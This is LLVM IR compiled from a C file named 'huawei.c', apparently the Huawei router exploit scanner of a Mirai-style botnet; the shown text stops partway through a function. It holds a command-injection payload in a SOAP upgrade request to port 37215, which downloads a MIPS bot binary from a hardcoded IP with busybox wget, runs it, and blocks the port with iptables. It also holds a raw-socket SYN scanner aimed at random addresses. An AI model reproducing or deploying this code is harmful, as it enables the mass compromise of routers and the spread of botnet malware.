; ModuleID = 'huawei.c'
source_filename = "huawei.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.huawei_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }

@huawei_scanner_pid = dso_local global i32 0, align 4
@huawei_rsck = dso_local global i32 0, align 4
@huawei_rsck_out = dso_local global i32 0, align 4
@huawei_scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@huawei_fake_time = dso_local global i32 0, align 4
@LOCAL_ADDR = dso_local global i32 0, align 4
@conn_table = dso_local global %struct.huawei_scanner_connection* null, align 8
@.str = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @huawei_recv_strip_null(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !6

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @huawei_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.huawei_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.huawei_scanner_connection*, align 8
  %23 = alloca %union.__SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #7
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %0
  %38 = load i32, i32* @huawei_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %37, %0
  ret void

41:                                               ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #7
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @huawei_fake_time, align 4
  %45 = call noalias align 16 i8* @calloc(i64 128, i64 5416) #7
  %46 = bitcast i8* %45 to %struct.huawei_scanner_connection*
  store %struct.huawei_scanner_connection* %46, %struct.huawei_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

47:                                               ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %64

50:                                               ; preds = %47
  %51 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

61:                                               ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %47, !llvm.loop !8

64:                                               ; preds = %47
  %65 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %65, i32* @huawei_rsck, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  call void @exit(i32 0) #8
  unreachable

68:                                               ; preds = %64
  %69 = load i32, i32* @huawei_rsck, align 4
  %70 = load i32, i32* @huawei_rsck, align 4
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %70, i32 3, i32 0)
  %72 = or i32 2048, %71
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 4, i32 %72)
  store i32 1, i32* %1, align 4
  %74 = load i32, i32* @huawei_rsck, align 4
  %75 = bitcast i32* %1 to i8*
  %76 = call i32 @setsockopt(i32 %74, i32 0, i32 3, i8* %75, i32 4) #7
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

78:                                               ; preds = %68
  %79 = load i32, i32* @huawei_rsck, align 4
  %80 = call i32 @close(i32 %79)
  call void @exit(i32 0) #8
  unreachable

81:                                               ; preds = %68
  br label %82

82:                                               ; preds = %86, %81
  %83 = call i32 @rand_next()
  %84 = and i32 %83, 65535
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %2, align 2
  br label %86

86:                                               ; preds = %82
  %87 = load i16, i16* %2, align 2
  %88 = call zeroext i16 @ntohs(i16 zeroext %87) #9
  %89 = zext i16 %88 to i32
  %90 = icmp slt i32 %89, 1024
  br i1 %90, label %82, label %91, !llvm.loop !9

91:                                               ; preds = %86
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i64 1
  %94 = bitcast %struct.iphdr* %93 to %struct.tcphdr*
  store %struct.tcphdr* %94, %struct.tcphdr** %4, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = load i8, i8* %96, align 4
  %98 = and i8 %97, -16
  %99 = or i8 %98, 5
  store i8 %99, i8* %96, align 4
  %100 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = load i8, i8* %101, align 4
  %103 = and i8 %102, 15
  %104 = or i8 %103, 64
  store i8 %104, i8* %101, align 4
  %105 = call zeroext i16 @htons(i16 zeroext 40) #9
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i16 %105, i16* %107, align 2
  %108 = call i32 @rand_next()
  %109 = trunc i32 %108 to i16
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 3
  store i16 %109, i16* %111, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 5
  store i8 64, i8* %113, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8 6, i8* %115, align 1
  %116 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %117 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 1
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %2, align 2
  %120 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  store i16 %119, i16* %121, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -241
  %126 = or i16 %125, 80
  store i16 %126, i16* %123, align 4
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  %130 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 5
  store i16 %129, i16* %131, align 2
  %132 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -513
  %136 = or i16 %135, 512
  store i16 %136, i16* %133, align 4
  br label %137

137:                                              ; preds = %91, %730
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %138 = load i32, i32* @huawei_fake_time, align 4
  %139 = load i32, i32* %10, align 4
  %140 = icmp ne i32 %138, %139
  br i1 %140, label %141, label %205

141:                                              ; preds = %137
  %142 = load i32, i32* @huawei_fake_time, align 4
  store i32 %142, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %143

143:                                              ; preds = %201, %141
  %144 = load i32, i32* %1, align 4
  %145 = icmp slt i32 %144, 160
  br i1 %145, label %146, label %204

146:                                              ; preds = %143
  %147 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %147, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i64 1
  %150 = bitcast %struct.iphdr* %149 to %struct.tcphdr*
  store %struct.tcphdr* %150, %struct.tcphdr** %16, align 8
  %151 = call i32 @rand_next()
  %152 = trunc i32 %151 to i16
  %153 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i32, i32* @LOCAL_ADDR, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 8
  store i32 %155, i32* %157, align 4
  %158 = call i32 @get_random_ip()
  %159 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 7
  store i16 0, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %164 = bitcast %struct.iphdr* %163 to i16*
  %165 = call zeroext i16 @checksum_generic(i16* %164, i32 20)
  %166 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %169 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 1
  store i16 %168, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 2
  store i32 %173, i32* %175, align 4
  %176 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 6
  store i16 0, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %180 = bitcast %struct.tcphdr* %179 to i8*
  %181 = call zeroext i16 @htons(i16 zeroext 20) #9
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %178, i8* %180, i16 zeroext %181, i32 20)
  %183 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 6
  store i16 %182, i16* %184, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 1
  %193 = load i16, i16* %192, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* @huawei_rsck, align 4
  %196 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %197 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %197, %struct.sockaddr** %196, align 8
  %198 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %199 = load %struct.sockaddr*, %struct.sockaddr** %198, align 8
  %200 = call i64 @sendto(i32 %195, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* %199, i32 16)
  br label %201

201:                                              ; preds = %146
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  br label %143, !llvm.loop !10

204:                                              ; preds = %143
  br label %205

205:                                              ; preds = %204, %137
  store i32 0, i32* %9, align 4
  br label %206

206:                                              ; preds = %205, %235, %242, %249, %258, %267, %275, %283, %291, %299, %311, %339
  store i32 0, i32* %18, align 4
  %207 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %20, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.tcphdr*
  store %struct.tcphdr* %211, %struct.tcphdr** %21, align 8
  %212 = call i32* @__errno_location() #9
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* @huawei_rsck, align 4
  %214 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i64 0, i64 0
  %215 = bitcast %union.__SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %215, align 8
  %216 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %23, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i64 @recvfrom(i32 %213, i8* %214, i64 1514, i32 16384, %struct.sockaddr* %217, i32* null)
  %219 = trunc i64 %218 to i32
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %18, align 4
  %221 = icmp sle i32 %220, 0
  br i1 %221, label %230, label %222

222:                                              ; preds = %206
  %223 = call i32* @__errno_location() #9
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 11
  br i1 %225, label %230, label %226

226:                                              ; preds = %222
  %227 = call i32* @__errno_location() #9
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 11
  br i1 %229, label %230, label %231

230:                                              ; preds = %226, %222, %206
  br label %351

231:                                              ; preds = %226
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp ult i64 %233, 40
  br i1 %234, label %235, label %236

235:                                              ; preds = %231
  br label %206

236:                                              ; preds = %231
  %237 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* @LOCAL_ADDR, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %243

242:                                              ; preds = %236
  br label %206

243:                                              ; preds = %236
  %244 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 6
  br i1 %248, label %249, label %250

249:                                              ; preds = %243
  br label %206

250:                                              ; preds = %243
  %251 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = load i16, i16* %252, align 4
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %256 = zext i16 %255 to i32
  %257 = icmp ne i32 %254, %256
  br i1 %257, label %258, label %259

258:                                              ; preds = %250
  br label %206

259:                                              ; preds = %250
  %260 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = load i16, i16* %2, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp ne i32 %263, %265
  br i1 %266, label %267, label %268

267:                                              ; preds = %259
  br label %206

268:                                              ; preds = %259
  %269 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 9
  %273 = and i16 %272, 1
  %274 = icmp ne i16 %273, 0
  br i1 %274, label %276, label %275

275:                                              ; preds = %268
  br label %206

276:                                              ; preds = %268
  %277 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = lshr i16 %279, 12
  %281 = and i16 %280, 1
  %282 = icmp ne i16 %281, 0
  br i1 %282, label %284, label %283

283:                                              ; preds = %276
  br label %206

284:                                              ; preds = %276
  %285 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 10
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  br i1 %290, label %291, label %292

291:                                              ; preds = %284
  br label %206

292:                                              ; preds = %284
  %293 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = lshr i16 %295, 8
  %297 = and i16 %296, 1
  %298 = icmp ne i16 %297, 0
  br i1 %298, label %299, label %300

299:                                              ; preds = %292
  br label %206

300:                                              ; preds = %292
  %301 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 %303) #9
  %305 = sub i32 %304, 1
  %306 = call i32 @htonl(i32 %305) #9
  %307 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %306, %309
  br i1 %310, label %311, label %312

311:                                              ; preds = %300
  br label %206

312:                                              ; preds = %300
  store %struct.huawei_scanner_connection* null, %struct.huawei_scanner_connection** %22, align 8
  %313 = load i32, i32* %9, align 4
  store i32 %313, i32* %18, align 4
  br label %314

314:                                              ; preds = %332, %312
  %315 = load i32, i32* %18, align 4
  %316 = icmp slt i32 %315, 128
  br i1 %316, label %317, label %335

317:                                              ; preds = %314
  %318 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %318, i64 %320
  %322 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %321, i32 0, i32 2
  %323 = load i32, i32* %322, align 8
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %331

325:                                              ; preds = %317
  %326 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %326, i64 %328
  store %struct.huawei_scanner_connection* %329, %struct.huawei_scanner_connection** %22, align 8
  %330 = load i32, i32* %18, align 4
  store i32 %330, i32* %9, align 4
  br label %335

331:                                              ; preds = %317
  br label %332

332:                                              ; preds = %331
  %333 = load i32, i32* %18, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %18, align 4
  br label %314, !llvm.loop !11

335:                                              ; preds = %325, %314
  %336 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %22, align 8
  %337 = icmp eq %struct.huawei_scanner_connection* %336, null
  br i1 %337, label %338, label %339

338:                                              ; preds = %335
  br label %351

339:                                              ; preds = %335
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %22, align 8
  %344 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %343, i32 0, i32 3
  store i32 %342, i32* %344, align 4
  %345 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %346 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %345, i32 0, i32 0
  %347 = load i16, i16* %346, align 4
  %348 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %22, align 8
  %349 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %348, i32 0, i32 4
  store i16 %347, i16* %349, align 8
  %350 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.huawei_scanner_connection* %350)
  br label %206

351:                                              ; preds = %338, %230
  br label %352

352:                                              ; preds = %351
  store %struct.fd_set* %5, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %353

353:                                              ; preds = %363, %352
  %354 = load i32, i32* %24, align 4
  %355 = zext i32 %354 to i64
  %356 = icmp ult i64 %355, 16
  br i1 %356, label %357, label %366

357:                                              ; preds = %353
  %358 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %359 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %358, i32 0, i32 0
  %360 = load i32, i32* %24, align 4
  %361 = zext i32 %360 to i64
  %362 = getelementptr inbounds [16 x i64], [16 x i64]* %359, i64 0, i64 %361
  store i64 0, i64* %362, align 8
  br label %363

363:                                              ; preds = %357
  %364 = load i32, i32* %24, align 4
  %365 = add i32 %364, 1
  store i32 %365, i32* %24, align 4
  br label %353, !llvm.loop !12

366:                                              ; preds = %353
  br label %367

367:                                              ; preds = %366
  br label %368

368:                                              ; preds = %367
  store %struct.fd_set* %6, %struct.fd_set** %27, align 8
  store i32 0, i32* %26, align 4
  br label %369

369:                                              ; preds = %379, %368
  %370 = load i32, i32* %26, align 4
  %371 = zext i32 %370 to i64
  %372 = icmp ult i64 %371, 16
  br i1 %372, label %373, label %382

373:                                              ; preds = %369
  %374 = load %struct.fd_set*, %struct.fd_set** %27, align 8
  %375 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %374, i32 0, i32 0
  %376 = load i32, i32* %26, align 4
  %377 = zext i32 %376 to i64
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %375, i64 0, i64 %377
  store i64 0, i64* %378, align 8
  br label %379

379:                                              ; preds = %373
  %380 = load i32, i32* %26, align 4
  %381 = add i32 %380, 1
  store i32 %381, i32* %26, align 4
  br label %369, !llvm.loop !13

382:                                              ; preds = %369
  br label %383

383:                                              ; preds = %382
  store i32 0, i32* %1, align 4
  br label %384

384:                                              ; preds = %490, %383
  %385 = load i32, i32* %1, align 4
  %386 = icmp slt i32 %385, 128
  br i1 %386, label %387, label %493

387:                                              ; preds = %384
  store i32 5, i32* %28, align 4
  %388 = load %struct.huawei_scanner_connection*, %struct.huawei_scanner_connection** @conn_table, align 8
  %389 = load i32, i32* %1, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.huawei_scanner_connection, %struct.huawei_scanner_connection* %388, i64 %390
  store %struct.huawei_scanner_connection* %391, %struct.huawei_scanner_connection** %7, align 8
